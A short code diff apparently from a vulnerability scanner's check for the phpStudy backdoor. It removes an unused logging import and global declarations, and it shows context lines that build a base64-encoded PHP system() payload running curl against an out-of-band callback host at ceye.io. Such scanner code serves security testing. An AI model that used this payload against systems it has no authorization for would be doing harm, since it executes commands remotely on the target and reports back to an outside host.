@@ -3,7 +3,6 @@ import requests
 import base64
 import random
 import time
-import logging
 import ClassCongregation
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
@@ -34,8 +33,7 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
+
     Random = str(random.randint(666, 666666))
     commandS = ('''system("curl http://{}_phpStudy_backdoor_{}.7ktb2x.ceye.io");''').format(url, Random)
     cmd = base64.b64encode(commandS.encode('utf-8'))
